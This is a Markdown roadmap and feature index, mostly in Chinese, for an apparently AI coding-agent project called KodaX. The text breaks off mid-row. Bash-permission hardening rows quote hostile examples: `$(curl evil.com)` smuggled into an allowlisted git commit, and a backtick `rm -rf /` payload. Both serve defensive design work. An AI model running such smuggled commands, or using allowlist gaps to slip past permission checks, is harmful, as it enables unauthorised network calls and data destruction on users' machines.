# Feature 总表

> 本文档变更记录见 git log；版本发布历史见 [CHANGELOG.md](../CHANGELOG.md)；
> 各 feature 的设计与版本决策见对应的 [docs/features/v{VERSION}.md](features/)。

> 中文阅读说明：
> 这份 `FEATURE_LIST` 是 roadmap 的总索引。
> 除了 feature 名称本身保留英文外，其余内容尽量用中文来说明“现在做到哪了、接下来做什么、该去哪里看设计”。
> `FEATURE_022` 是当前架构转向的总 feature，`019/025/029/034` 是它下面的关键支撑切片。

---

## 当前概况

| Item | Value |
|---|---|
| Tracked feature IDs | `001-159, 164-173, 184, 186-199` (026, 118, 129, 133, 135-136, 138, 140 removed/never-claimed; 150 shipped via CHANGELOG/v0.7.37.md only — not in master table; 160-163, 174-185 tracked elsewhere — recent v0.7.42 work, see version doc; 187 promoted to v0.7.43 — stall-sidecar middleware unification, ADR-030 §1584 placeholder cashed in; 194 立项 2026-05-23 — package consolidation 9 → 4 workspace packages 合 5 子包 per ADR-036; 195+196 立项 2026-05-24 — F184 sidecar verifier 用户实战 session 截图反馈两个 UX/架构 gap: silent accept UI hide + content-aware fire gate; 197 立项 2026-05-24 — F191 read-only SDK follow-up `discoverMarkdownAgents` API 对标 F035 discoverSkills 形态; 198 立项 2026-05-25 — Provider capability metadata JSON-backed single source of truth, v0.7.43 SDK exposure refactor 遗留架构债 closure, upstream `/models` API 探针确认 KodaX self-maintained snapshot 是唯一可靠源; 199 立项 2026-05-26 — Sibling-aware child dispatch `task_id:<id>` evidence_refs prefix 复用 F177 snapshot finalText, 顺带修 unknown-prefix 静默 fallthrough) |
| Total tracked features | `73` |
| Completed | `0` |
| Cancelled | `6` |
| Absorbed | `3` |
| InProgress | `1` |
| Planned | `72` |
| Current released version | `v0.7.42` |

> Note: `Planned` includes 9 strikethrough rows (`095` absorbed → 057, `059` absorbed → 084, `063` cancelled, `073` cancelled, `094` cancelled 2026-05-19 after necessity probe, `109` cancelled, `111` absorbed → 115, `122` cancelled, `127` cancelled never-planned) that remain in the planned table for traceability. The `Cancelled` and `Absorbed` counters above slice the same rows by lifecycle reason. `125` was re-scoped from v0.8.10 mode-based design to v0.7.41 LLM-First auto coordination — see its row for rationale.
>
> **Archive note (2026-05-19)**: 99 completed features (IDs spanning `v0.3.1` → `v0.7.41`, plus `v0.8.0` unreleased) were moved to [`FEATURES_ARCHIVED.md`](FEATURES_ARCHIVED.md) to keep this file scoped to live (Planned / InProgress) work. The `Total tracked features` and `Completed` counters above reflect the post-archive state. Historical Released-version totals: `160` tracked / `99` completed.

### 各版本待做分布

> Auto-generated from row contents (see `tests/tracker-consistency.test.ts` enforced parity). Cancelled / absorbed / re-scoped rows still appear here under their **original** planned column for traceability — they show as `~~v0.7.x~~` strikethrough. Em-dash row corresponds to FEATURE_127 (Cancelled, never planned — no version slot).

| Version | Planned features |
|---|---|
| `v0.7.18` | `1` |
| `~~v0.7.25~~` | `1` |
| `v0.7.28` | `2` |
| `v0.7.29` | `4` |
| `v0.7.30` | `2` |
| `v0.7.31` | `3` |
| `v0.7.35.1` | `3` (142 Package Boundary Cleanup + Capability Sections Dedup Helper; 144 AMA Worker Capability Context Parity — 修复 v0.7.26 起 6 段 capability 漂移; 145 Agent Config Home Resolution Pipeline — 3-tier DI/env/default 修复 substrate consumer 耦合；v0.7.36 主线工作前置) |
| `v0.7.36` | `6` (114/115/119 + 131 + 130 + 143 Skill UX Upgrade + prompt-overlay 错位修正) |
| `v0.7.37` | `5` (116 + 141 + 146 v0.7.36 Behavioral Eval Follow-ups + 147 npm Publishing Pipeline + 148 Pattern B Multi-Turn Async Discipline) |
| `v0.7.38` | `9` (149 Queued Prompt Injection Latency & Mid-Turn UX Parity + 117 redesigned as Mutation Context Injection + 151 TodoList Visibility & LLM Self-Seeding Parity + 152 Bash AST Migration + 153 LLM-backed Bash Prefix Extractor + 154 Universal --help Fast-Path + 155 Chat-While-Waiting [moved from v0.7.39] + 156 Idle-Wait Visual Continuity + 157 Windows / macOS Case-Insensitive Workspace Match) |
| `v0.7.39` | `2` (120 + 158 auto[llm] Signal Inversion; FEATURE_155 moved to v0.7.38) + ADR-024 (npm 包正名 `@kodax-ai/kodax-cli` → `@kodax-ai/kodax` + 5 SDK subpath exports) + ADR-025 (auto[llm] 信号化分类器 + 决策层级倒置) |
| `~~v0.7.39 (legacy slot for FEATURE_096)~~` | `1` |
| `~~v0.7.41~~` | `1` |
| `v0.7.42` | `5` (173, 175, 184, 186, 188; 184 原计划 v0.7.45, 实际在 v0.7.42 release window 内 ship 2026-05-21, doc 已迁移; 188 新立项 2026-05-21 — dispatch_child worktree drop + prompt 量化阈值删 per ADR-034) |
| `~~v0.7.42~~` | `1` (094 Cancelled 2026-05-19 — necessity probe 0/43) |
| `v0.7.43` | `11` + `SDK-MODEL-CAPS` polish (124, 189, 189-extended, 187, 190, 191, 193, 194, 195, 196, 197 + SDK-MODEL-CAPS — 187 promoted from ADR-030 §1584 placeholder; 190 F184 cleanup tail; 191 User-Authored Custom Agents per ADR-035 supersedes v0.7.50 FEATURE_128 placeholder; **193 V1 Chain Full Retirement — Scout/Planner/Generator chain agents + entry routing + V1 emit tools 全面退役（已 ship 12 commits）**; **194 Package Consolidation — 9 → 4 workspace packages 合 mcp / skills / tracing / session-lineage 进 agent + repointel-protocol 进 coding，per ADR-036，严格在 193 完整 push 后启动**; **195+196 立项 2026-05-24 — F184 sidecar verifier 用户实战 session 截图反馈两个 UX/架构 gap: 195 silent accept UI hide (REPL render filter) + 196 content-aware fire gate (action-surface + conversational intent skip)**; **189-extended 立项 2026-05-24 — 用户授权 v0.7.43 完整收尾 FEATURE_189 全 prompt audit 而非 push v0.7.44**; **SDK-MODEL-CAPS 2026-05-25 — 9 new SDK exports + `KodaXModelCapabilities` type, expose per-model contextWindow / maxOutputTokens / thinkingBudgetCap without API key for embedder UIs, see [v0.7.43.md SDK Polish](features/v0.7.43.md#sdk-polish-per-model-capabilities-without-api-key-feature-sdk-model-caps); FEATURE_198 v0.7.44 splits snapshot to JSON for hot-update**) |
| `~~v0.7.43~~` | `1` |
| `v0.7.44` | `4` (123, 192, 198, 199) — **shipping window 2026-05-25 → 2026-05-28 all 4 shipped end-to-end with ZERO v0.7.45 deferred items + post-architect/security review harden**: F198 1-phase atomic provider-capabilities.json SoT; F192 Phase A-F end-to-end + continuation prompt Codex-faithful rewrite (Phase F runtime wire + lifecycle.ts persistence bug fix + Layer 2 panel 73% aggregate 3-active-alias SHIP gate MET; continuation prompt restored to Codex parity after ADR-033 §4 misapplication caught in user review); F123 base routing + per-turn flood throttle + seen_by multi-hop cycle list + **prompt-injection escape harden across all 4 wrapper paths**; F199 sibling-aware dispatch `task_id:<id>` evidence_refs prefix + unknown-prefix visible error + **finalText fence-wrap + 10000-char cap + fence-defang security harden** (post-architect/security review 2026-05-28: closes 2 HIGH multi-hop prompt-injection vectors flagged independently) |
| `v0.7.45` | `1` (102; 原 184 已迁至 v0.7.42) |
| `v0.7.46` | `1` |
| `v0.7.47` | `1` |
| `~~v0.7.48~~` | `1` (109 Cancelled — scope 全部已被 124/090/101/104 覆盖；ablation eval 成本过高) |
| `v0.7.49` | `1` (132 LSP 5 语言) |
| `v0.7.50` | `1` |
| `v0.8.0` | `4` (007/030/137/093 — 030+137 share Multi-Surface Delivery scope) |
| `~~v0.8.0~~` | `1` |
| `v0.8.2` | `1` |
| `v0.8.20+` | `1` (139 NotebookEdit, deferred) |
| `v0.8.x` | `1` |
| `—` | `1` (127 Cancelled — never planned, see row below for re-scope into FEATURE_120 + FEATURE_102) |

---

## 进行中的 Feature

| ID | Title | Planned | Design |
|---|---|---|---|
| `057` | Claude-Aligned TUI Substrate Refactor | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_057-claude-aligned-tui-substrate-refactor) |

---

## 计划中的 Feature

| ID | Title | Category | Priority | Planned | Design |
|---|---|---|---|---|---|
| `087` | ConstructionRuntime and Constructed-World Substrate | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_087-constructionruntime-and-constructed-world-substrate) |
| `088` | Self-Construction Tier 2 — Tool Generation | Core | High | `v0.7.28` | [v0.7.28](features/v0.7.28.md#feature_088-self-construction-tier-2--tool-generation) |
| `100` | SA Runner Frame Adoption & Capability Unification | Internal / Refactor | Critical | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) |
| `078` | Role-Aware Reasoning Profiles | Internal | High | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_078-role-aware-reasoning-profiles) |
| `103` | Scout Calibration & L5 User-Followup Escalate | Internal | Medium | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate) |
| `104` | Prompt-Eval Harness Module | Internal / Test Infrastructure | Medium | `v0.7.29` | [v0.7.29](features/v0.7.29.md#feature_104-prompt-eval-harness-module) |
| `060` | Claude-Aligned Bounded-Memory Runtime and OOM Hardening | Internal | High | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_060-claude-aligned-bounded-memory-runtime-and-oom-hardening) |
| `101` | Constructed Agent Admission Contract — Quality Invariants & 5-Step Manifest Vetting | Core / Safety Substrate | Critical | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_101-constructed-agent-admission-contract) |
| `089` | Self-Construction Tier 3 — Agent Generation | Core | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_089-self-construction-tier-3--agent-generation) |
| `106` | AMA Harness Selection Calibration — Scope-Aware ToolGuardrail + Scout Prompt Hard Rule | Core / Quality | High | `v0.7.31` | [v0.7.31](features/v0.7.31.md#feature_106-ama-harness-selection-calibration) |
| `142` | Package Boundary Cleanup — `@kodax/core` Removal & `@kodax/agent` Reaffirmation + Capability Sections Dedup Helper | Internal / Refactor | Critical | `v0.7.35.1` | [v0.7.35.1](features/v0.7.35.1.md#feature_142-package-boundary-cleanup--kodaxcore-removal--kodaxagent-reaffirmation) | **Patch release** 修复 v0.7.24 FEATURE_082 包结构漂移 + 新增 capability sections dedup helper（FEATURE_144 前置基础设施）。Batch A-D：`@kodax/core` 30 文件并入 `@kodax/agent`；session/persistence/compaction 回流 `@kodax/session-lineage`；Self-Construction 从 coding 迁到 agent；coding/agent-runtime/ 通用 middleware 上提。Batch E：新建 `@kodax/coding/src/prompts/capability-sections.ts` dedup helper 集中 13 段 prompt section 拼装，SA path 输出字节级相同，是 FEATURE_144 接通 AMA worker 的前置工具。**全部 batch 零业务逻辑改动 / 零 prompt 字面量改动**——TypeScript 编译器 + grep gate + 既有 ~5000 单元测试 + FEATURE_104 prompt eval 不重跑。**ADR-001 更新**反映 8 包结构 + **ADR-021 新增**写明 `@kodax/agent` vs `@kodax/coding` 边界规则 |
| `144` | AMA Worker Capability Context Parity — Fix v0.7.26 Bypass Latent Bug | Core / Quality | High | `v0.7.35.1` | [v0.7.35.1](features/v0.7.35.1.md#batch-f--ama-worker-capability-context-parity-fix必做batch-e-之后) | **同 v0.7.35.1 ship**（与 FEATURE_142 同 patch release，独立 feature 便于独立 ship gating）。修 v0.7.26 FEATURE_084 把 AMA worker 从 SA path 迁到 Runner-driven 时漏接 6 段 capability prompt section 的 latent bug：mcp-capability-context / skills-addendum / project-agents（AGENTS.md/CLAUDE.md）/ tool-construction / git-context / project-snapshot。过去 v0.7.26 + v0.7.27 FEATURE_086 注释自陈手工补过 5 段（environment / runtime-fact / working-dir / repo-intel / base-suffix），剩余 6 段一直 latent；用户实战已踩坑 3 项（MCP minimax server / `feature-list-tracker` skill / KodaX 自身 CLAUDE.md 项目规则被 AMA worker 完全忽略）。**修法**：AMA worker `role-prompt.ts` 调用 FEATURE_142 Batch E 的 `buildCapabilityContextSections()` helper，得到全部 6 段；新增 `gitContextSnapshot` / `projectSnapshotSnapshot` 两个 parent cache 字段（避免每 worker FS load）。**行为修复**——触发 FEATURE_104 prompt eval 重跑（`tests/ama-worker-capability-parity.eval.ts`，4 维度验收：worker 不退化 instruction following / 用户配 MCP 时 worker 主动调 `mcp_search` / 项目 CLAUDE.md 含硬规则时违反率 ≤ baseline / dirty repo Generator edit 前主动声明 git 状态），mean ≥80% 通过率作为 ship gate。**eval 失败 follow-up**：FEATURE_144 单独回退到 v0.7.35.2 retry，FEATURE_142 ship 不阻塞；如 root cause 是 worker token 溢出之类设计问题则 fold 进 v0.7.36 FEATURE_143 重新评估。**`prompt-overlay` 错位修正不在本 feature**——属"position 类"漂移而非"missing data 类"，迁移需更全 prompt eval，留 v0.7.36 FEATURE_143 |
| `145` | Agent Config Home Resolution Pipeline — 3-Tier Priority (DI / Env / Default) | Internal / Refactor | Medium | `v0.7.35.1` | [v0.7.35.1](features/v0.7.35.1.md#feature_145-agent-config-home-resolution-pipeline--3-tier-priority-di--env--default) | **同 v0.7.35.1 ship**（与 FEATURE_142 同 patch release，独立 feature 因 scope 独立——config home 与 capability injection 是不同主题）。修当前 `~/.kodax/` 在 6 个包共 ~30 处硬编码（仅 `@kodax/ai/reasoning-overrides.ts:49` 一处实现 `KODAX_HOME` env var 兜底，其余 29 处全无），导致 (a) 漂移风险（每加新 fs path 又一处硬编码）+ (b) **substrate consumer 耦合**（`@kodax/agent` 作为通用底座被未来 `@kodax/ops-agent` / `@kodax/data-analysis-agent` 等 consumer 调用时无法重定向 config dir）。**修法**：抽 `@kodax/agent/src/runtime/agent-home.ts` helper（~30 LoC + ~60 LoC test），3-tier 优先级：(1) `setAgentConfigHome(path)` 程序入参（最高，substrate consumer boot 时 set 一次）→ (2) `KODAX_HOME` env var（中，shell/CI/测试隔离）→ (3) `~/.kodax/` hardcoded default（最低，standalone kodax CLI 90% 场景）。**Singleton pattern**（与 `process.env.NODE_ENV` 同模式）避免 per-call DI 改 ~50 个函数签名 invasive。**显式不做** brand abstraction（YAGNI；DI 入参直接接受路径字符串足够覆盖任意 substrate consumer 重定向 use case）。**零行为变更**——DI 不传 + env 不设时 default 分支与现状字节级等价；FEATURE_104 prompt eval **无需重跑**。验收用 grep gate：`grep -rE "['\"]\\.kodax['\"]" packages/*/src/` 命中数从 ~30 降到 ≤ 5（helper + 必要的 path comparison）|
| `114` | AMA Harness V2 — Worker + Evaluator (Evaluator Preserved as Structural Gate) | Internal / Architecture | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_114-ama-harness-v2--worker--evaluator-evaluator-preserved-as-structural-gate) |
| `115` | Message Queue Foundation — agentId-Scoped 2-Tier Priority Queue + Sleep-Gated Mid-Turn Drain | Internal / Infrastructure | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_115-message-queue-foundation--agentid-scoped-2-tier-priority-queue--sleep-gated-mid-turn-drain) |
| `119` | Async Child Dispatch — Pattern B (Launch + Await) | Internal / Architecture | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_119-async-child-dispatch--pattern-b-launch--await) |
| `143` | Skill UX Upgrade + prompt-overlay 错位修正 | Enhancement / UX + Internal / Refactor | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_143-skill-ux-upgrade--prompt-overlay-错位修正) | v0.7.35.1 FEATURE_144 已修完 6 段 capability "missing data" 漂移；本 feature 收尾 1 段"position 类"漂移（`prompt-overlay` 从 user prompt 头迁回 system prompt，对齐 SA path）+ Skill 用户层 UX 三件（manifest 措辞硬化为 Claude Code 风格强约束 / classic CLI 启动时 skillsPrompt 构造与 Ink TUI 对齐 / `parseCommand` 加 mid-line `/skill:foo` 检测）。触发完整 prompt eval 验证 prompt-overlay 位置迁移不退化 worker H0/H1/H2 routing 行为 |
| `116` | Active Cache Control Foundation — cache_control Markers + 12 Provider Adapters | Internal / Cost Optimization | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_116-active-cache-control-foundation) |
| `146` | v0.7.36 Behavioral Eval Follow-ups — FEATURE_143 / FEATURE_119 / FEATURE_131-B Multi-Alias LLM-Judge Sweep | Internal / Quality Gate | Medium | `v0.7.37` | [v0.7.37](features/v0.7.37.md#v0736-behavioral-eval-follow-ups正式-track非隐式-defer) | **正式 track，非隐式 defer**：v0.7.36 ship 时三个 LLM-facing 改动（FEATURE_119 Pattern B / FEATURE_131-B Unicode normalization / FEATURE_143 prompt-overlay 位置迁移）只跑了**结构 eval + dataset 回归**（无 API key、无 LLM judge），把 v0.7.36 design doc 原本要求的 multi-alias × multi-task 行为 eval 显式 track 到 v0.7.37 内必须完成的 quality gate。三份 sub-eval 总规模：A: 96 cells (FEATURE_143) + B: 20 cells (FEATURE_119) + C: 60 cells (FEATURE_131-B) = 176 cells，预算 ~$30。三份共享 FEATURE_104 benchmark/harness。任一不过门发独立修复 patch，不阻塞 v0.7.37 主线 FEATURE_116/141 ship |
| `147` | npm Publishing Pipeline — Multi-Package Release + Scope Rename + ai→llm Rename | Internal / Distribution | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_147-npm-publishing-pipeline--多包发布管线--scope-重命名--aillm-改名) | v0.7.36 期间已发布占位包 `@kodax-ai/cli@0.0.1` 锁住 `@kodax-ai` 命名空间（unscoped `kodax` 被 npm 反 typosquat 拒，改 scoped 是官方建议）。本 feature 完成全套真实发布：(1) 9 个子包 `@kodax/xxx` → `@kodax-ai/xxx` 重命名；(2) 顺手把 `@kodax/ai` 改为 `@kodax-ai/llm`（避免 `@kodax-ai/ai` 重复语义）；(3) 792 处 import (packages/+src/+tests/+benchmark/) + 55 处 dependency + 6 处 tsconfig paths 批量替换 = 853 处总改动；(4) 每包加 `files` / `publishConfig` 字段；(5) workspace 通配 `*` 转具体版本；(6) 写 `scripts/release-npm.mjs` 一键发布脚本（10 包按依赖顺序）。**Migration impact**：CLI 用户零影响、npm 库用户首次发布无旧名字习惯、git-clone 高级用户需 sed 替换（CHANGELOG 给出 sed 模板）。预估 ~1 天完成。**显式不做**：自动化 changesets / npm provenance 签名 / bin 改名 |
| `148` | Pattern B Post-Dispatch Probe — Anti-Immediate-Await Rule + Layer 2 Single-Turn Behavioral Eval | LLM Prompt / Quality Gate | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_148-pattern-b-post-dispatch-probe--anti-immediate-await-rule--layer-2-single-turn-行为-eval) | **v0.7.37 重发版本里 fold 进的 Layer 2 quality gate**（原计划 v0.7.37.1 patch，最终与 v0.7.37 同期 ship）。FEATURE_146-B 单轮 trigger eval（76-88% 并行触发率）**测不出** "派出去 → 立即 await" 退化模式。**初版本设计为 multi-turn mock executor harness 让 LLM 自由跑 6 轮，构成 [EVAL_GUIDELINES.md §反模式 2](../benchmark/EVAL_GUIDELINES.md) "let LLM run free, aggregate trace"——已修正为 Layer 2 single-turn probe**：构造"刚 dispatch 完，task_id 已回执"的 pre-canned 3-message history，单次 `provider.stream` 调用，机械断言下一个 tool_use 是不是 `await_child_task` on `child-1`。**载荷**：(1) `benchmark/datasets/pattern-b-post-dispatch-probe/cases.ts` — 5 个 "user 显式说 WHILE X runs, also do Y" canned history 场景；(2) `worker-role-prompt.ts` `dispatchRules` 加 anti-immediate-await 反例硬约束（"dispatch X, then DO Y, then await X" 具象语句）；(3) `tests/feature-148-post-dispatch-probe.eval.ts` 5 alias × 5 scenario × 3 reps = 75 probes。**实测 2026-05-08 一轮 sweep（291.6s, $1-4）**：degenerate-rate = **0.0% (0/75)** 跨 5 个 production alias（zhipu/glm51 / kimi / mmx/m27 / ds/v4pro / ds/v4flash 全 0/15）；non-degenerate 选择 100% 是用户显式要求的 side-task（3 scenario 选 read，2 scenario 选第二个 dispatch_child_task）。**Caveat**: 没跑 A/B baseline（pre-FEATURE_148 prompt）作 attribution，留作 optional follow-up。报告 → `docs/test-guides/FEATURE_148_v0.7.37_BEHAVIORAL_EVAL.md`。初版本草稿的 multi-turn mock-executor primitive + 多轮 eval 已删除（Layer 2 设计零 current use case） |
| `117` | ~~Read-Path Context Stripping~~ → **Mutation Context Injection** (v2, ships v0.7.38) | Enhancement / Quality | Medium | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_117-v2-write-child-mutation-context-injection) | **Re-scoped 2026-05-09**：原前提（child 继承 5.2k token stable context）经实施期事实核查否定——`child-executor.ts` 的 `systemPromptOverride: CHILD_AGENT_SYSTEM_PROMPT` 走 `reasoning-plan-entry.ts:112-113` `??` 短路 `buildSystemPrompt`，child 已处于 ~500 token 干净状态，无 token 可省。**真实问题反向**：write child 也用同一 minimal override，看不到 AGENTS.md 的 mutation policy / forbidden items / coding style。**v2 实现 = 在 `executeWriteChild` 通过 `buildWriteSystemPrompt(parentCtx.gitRoot)` 把 AGENTS.md 拼到 `CHILD_AGENT_SYSTEM_PROMPT` 后**（read child 维持 minimal）；lookup 走 parent gitRoot 因为 worktree 是 transient checkout 不含 AGENTS.md；复用 FEATURE_149 Phase 1.2 mtime cache + FEATURE_116 cache_control: ephemeral 让 fan-out 仅一次计费。**配套清理（不属 117 范围）**：KodaX 只读 `AGENTS.md` 不读 `CLAUDE.md`，`agents-loader.ts:CONTEXT_FILE_CANDIDATES` 改为 `["AGENTS.md"]`；CLAUDE.md 是 Claude Code 专属语义文件，注入会语义错配。**实现 ~17 LoC，4 unit case 锁定行为，无新 prompt eval（仅复用项目已有 AGENTS.md 内容）** |
| `149` | Queued Prompt Injection Latency & Mid-Turn UX Parity — Remove `setTimeout(50)` + AGENTS.md mtime cache + interruptible-tool fast-abort + batched drain + up-arrow popAllEditable | Enhancement / UX + Internal / Performance | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_149-queued-prompt-injection-latency--mid-turn-ux-parity) | **基于 2026-05-08 forensic 双向 source 对照立项**（KodaX vs `c:/Works/claudecode/src/`）。用户实战反馈"输入 queue 排队指令时并没有尽快注入"——确认 4 个延迟源叠加 floor 53ms / 上限 161ms 单轮排队：(L1) [`InkREPL.tsx:6267`](../packages/repl/src/ui/InkREPL.tsx#L6267) `stageQueuedPrompt` 末尾硬编码 `setTimeout(50)` 不可避免 50ms；(L2) [`agents-loader.ts:70`](../packages/coding/src/context/agents-loader.ts#L70) `loadAgentsFiles` 每轮 `existsSync`+`readFileSync` 全树遍历无 mtime cache，对照 Claude Code `services/claudemd.ts` + `utils/fileReadCache.ts`；(L3) [`StreamingContext.tsx:344`](../packages/repl/src/ui/contexts/StreamingContext.tsx#L344) `FLUSH_INTERVAL=80` 流式节流可能延迟 round-complete 检测；(L4) `notify()` 走 `forceUpdate()` 而非 `useSyncExternalStore`。**叠加 3 个架构 UX 缺口**：(G1) 长 bash 跑 30s 时新 prompt 必须等完，无 `interruptBehavior: 'cancel'` 工具标记 + fast-abort 路径；(G2) [`queued-prompt-sequence.ts:32-43`](../packages/repl/src/ui/utils/queued-prompt-sequence.ts#L32-L43) 一次 shift 一条跑一整轮 agent，N 条排队 = N 次 agent 调用（cost 浪费 + LLM 失去整体规划视角）；(G3) 队列只显示一行摘要 + Esc 砍最新，无 up-arrow popAllEditable 编辑/重排。**3 phase 实施**：Phase 1 Slice A 延迟清理（A1+A2+A3+A4 零行为变更，~1 天，无 prompt eval）；Phase 2 Slice C UX 表面（C1 up-arrow + C2 多条独立渲染，~0.5 天，纯 UI）；Phase 3 Slice B 行为变更（B1 interruptible-tool fast-abort + B2 abort 时合成 `tool_result` error block + B3 批量 drain 多 user message 进单轮，~2 天，触发 FEATURE_104 prompt eval 5 alias × 4 task = 20 cells × 5 = 100 cells 预算 ~$8）。**验收硬指标**：micro-bench `tests/queue-injection-latency.bench.ts` floor < 5ms；bash 30s sleep 时新 prompt 500ms 内起轮；5 条排队 = 1 次 agent 调用（cost tracker `agentInvocationCount` 验证）；跨 family eval mean ≥ baseline / max-min spread ≤ 15pp。**显式不做**：Council / multi-advisor consult（FEATURE_105 v0.7.46 范围）；input-as-async-generator 架构（state-setter 即可，与 Claude Code 同模型）；改 ESC / `MAX_PENDING_INPUTS` / FEATURE_115 priority 字段；soft-pause 状态机（FEATURE_111 v0.7.43 范围）；mid-tool-call 注入 |
| `151` | TodoList Visibility & LLM Self-Seeding Parity — Closing the FEATURE_097 Coverage Gap (MIN=1 + LLM op:'init' + Persistent Surface) | Enhancement / UX | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_151-todolist-visibility--llm-self-seeding-parity--closing-the-feature_097-coverage-gap) | **基于 14 维度 KodaX vs `c:/Works/claudecode/src/` 双向对照立项**。FEATURE_097 (v0.7.34) + v0.7.35.1 hotfix + v0.7.38 FEATURE_149 Slice C4 之后代码全链路存在，但 5 道叠加 gate 让用户感知率接近 0%：(G1) `todo_update` 无 LLM 自主 init 路径，必须 Runner 从 Scout `executionObligations >= 2` 单源种入；(G2) Scout 多步骤判断硬 gate；(G3) UI `MIN_ITEMS_TO_RENDER = 2`；(G4) `todo-throttle-reminder` 的 `hasItems()` 死锁让空 store 永不提醒；(G5) `showSpinner === true` mount gate + 5s linger 销毁。**G1 是最深的根因**——前 4 道全部放宽 LLM 也没有工具能 init。**3 Slice 实施**：Slice A UI parity（`MIN_ITEMS=1` + drop linger + drop spinner gate，对齐 CC `tasks.length === 0` 才不渲染 + `expandedView==='tasks'` 持久语义）；Slice B LLM Self-Seeding（`todo_update` 加 `op: 'init'/'update'` 双模式，等价 CC `TodoWrite` 全列表写；`todo-throttle-reminder` 移除 `hasItems` gate；role-prompts Scout/Generator/Planner 三段提示 op:'init' 用法）；Slice C 持久可见（drop `setTodoItems([])` 5s 销毁 useEffect，items 跨 AMA 任务在 React state 自然续存）。**Slice C 校正 (2026-05-11)**：原 Slice C 让 todoItems 在 task 完成后无限残留在 input 框上方——与 Claude Code 实际行为不符。CC `Spinner.tsx` 把 TaskListV2 嵌在 spinner 内（loading 期可见 / completed 后随 spinner unmount 一起消失），standalone REPL.tsx 路径默认 `expandedView==='none'` 不渲染。KodaX 校正方案：在 `InkREPL.tsx` 加 `useEffect` 监听 `isLoading` true→false edge，触发 `setTodoItems([])` 立即清空——既保留 task 期间持久可见，又对齐 CC run-end 自动消失语义。**触发 FEATURE_104 prompt eval**（B3 改 `role-prompt.ts` + `todo_update` description）：`tests/feature-151-todo-self-seeding.eval.ts` 5 alias × 4 case 验证 LLM 在 Scout 不 seed 但任务多步骤时能自发调 init。**与 FEATURE_113 (v0.8.2) 关系**：onTodoUpdate event 流增加来自 LLM init 的来源，payload schema 不变；JSON consumer 不需要区分种入路径 |
| `152` | Bash 命令解析 regex → AST Migration — `shell-quote` Replaces Strip-Then-Classify | Core / Security | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_152-bash-ast-migration) | **基于 [Issue 129](KNOWN_ISSUES.md#129) 修复经验立项**。Issue 129 的最终 Resolution 用"strip-then-classify hotfix"擦掉 fd-redirect-to-null 假阳性，但同 Resolution 也明确把"shell parser"路径列为超 scope 留给后续。FEATURE_152 把那个被推迟的工作做完：用 `shell-quote@1.8.3` (~12KB pure JS, **不引入 tree-sitter+wasm**) 在 [`packages/repl/src/permission/bash-ast.ts`](../packages/repl/src/permission/bash-ast.ts) 提供 `parseBashCommand`，输出结构化 `BashCommandTree`（statements split on `&&`/`\|\|`/`;` + 每段 pipeline stages split on `\|` + 每个 stage 的 argv + 结构化 redirections 含 `fd`/`append`/`input`/`target` 字段 + `unparseable: true` flag 用于 fail-closed）。**4 slice 实施**：(1) module + tests scaffold（无集成）；(2) `isBashReadCommand` / `isBashWriteCommand` 完全切到 AST，删除 `NULL_DEVICE_REDIRECT_PATTERN` / `BASH_WRITE_COMMAND_REGEXES` / `BASH_REDIRECTION_WRITE_PATTERN` / `BASH_WRITE_SUBCOMMAND_PATTERNS` 四个 strip-then-classify 常量；(3) `extractPathsFromCommand` / `collectBashWriteTargets` hybrid AST + legacy regex（shell-quote POSIX-escape 吃掉 Windows 反斜杠路径如 `C:\Users\foo` → `C:Users` + `oo\bar.txt`，所以 Windows-path 识别保留 regex 兜底）；(4) cleanup + 14 个 attack-surface hardening tests + Issue 129 follow-up doc 把 hotfix 升级标注为结构性解决。**AST 层防御**：`shell-quote` 把 `` ` `` 当普通字符放进 string token 会让 `echo \`rm -rf /\`` 通过 read check；`parseBashCommand` 在 tokenise 前显式 `trimmed.includes('\`')` 检测并 fail-closed。**与 FEATURE_153/154 关系**：FEATURE_154 `--help` fast-path 在 AST 解析之前命中，省 LLM 调用；FEATURE_153 LLM extractor 在 accept-edits 模式 allowlist 匹配，不依赖 AST。三者职责互补不重叠 |
| `153` | LLM-Backed Bash Prefix Extractor — Replace Naive `startsWith` Allowlist Matching With Extracted Safe-Prefix | Core / Security | High | `v0.7.38` | [v0.7.38](features/v0.7.38.md#feature_153-llm-backed-bash-prefix-extractor) | **基于 [Issue 129](KNOWN_ISSUES.md#129) 后续 KodaX vs `c:/Works/claudecode/src/` 对照立项**。CC [`commands.ts:438-499 BASH_POLICY_SPEC` + `utils/shell/prefix.ts:createCommandPrefixExtractor`](C:\Works\claudecode\src\utils\bash\commands.ts#L438-L499) 让 LLM 提取 bash 命令的 SAFE PREFIX，allowlist `Bash(git commit:*)` 匹配的是抽取出来的前缀（精确相等）而不是裸 `command.startsWith(...)`。KodaX 当前 [`permission.ts:matchesBashPattern`](../packages/repl/src/permission/permission.ts) 用 `command.startsWith(pattern)` 朴素判断——`git commit -m "x" $(curl evil.com)` 直接命中 `Bash(git commit:*)` 走 auto-allow，命令注入逃过授权。**实现 ~400 LoC**：(1) 新模块 [`packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.ts`](../packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.ts) 含 `BASH_POLICY_SPEC` 系统提示（移植 CC 验证过的提示工程）+ `extractCommandPrefix` 单次抽取 + `createBashPrefixExtractor` LRU cache（200 entries）+ identity-guard cache eviction；(2) `isToolCallAllowed` 同步 → 异步 + 可选 `extractor?` 参数 + 失败兜底（throw → false → 走 confirmation prompt 